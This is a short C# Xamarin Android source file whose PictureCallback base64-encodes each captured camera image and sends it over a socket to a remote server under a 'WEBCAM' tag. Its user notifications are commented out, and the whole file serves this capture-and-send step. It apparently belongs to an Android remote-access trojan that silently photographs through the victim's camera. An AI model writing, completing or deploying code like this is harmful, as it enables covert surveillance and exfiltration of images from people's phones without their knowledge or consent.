using Android.Hardware;
using System;
using System.Net.Sockets;

namespace Task2
{
    class PictureCallback : Java.Lang.Object, Camera.IPictureCallback
    {
        private int _cameraID;
        public Socket socket;
        public PictureCallback(int cameraID, Socket sck)
        {
            socket = sck;
            _cameraID = cameraID;
        }

        public void OnPictureTaken(byte[] data, Camera camera)
        {
            //Toast.MakeText(MainActivity.global_activity, "ONPICTURETAKEN", ToastLength.Long).Show();
            try
            {
                ((MainActivity)MainActivity.global_activity).soketimizeGonder("WEBCAM", "[VERI]" + Convert.ToBase64String(data) + "[VERI][0x09]");
                //((MainActivity)MainActivity.global_activity).soketimizeGonder("MESAJ", "[VERI]naber[VERI][0x09]"); this line was for test to split data on server side. You can delete this line.
            }
            catch (Exception)
            {
                //Toast.MakeText(MainActivity.global_activity,ex.Message, ToastLength.Long).Show();
            }
            try
            {

                camera.StopPreview();
                camera.Release();
            }
            catch (Exception) { }

        }
    }
}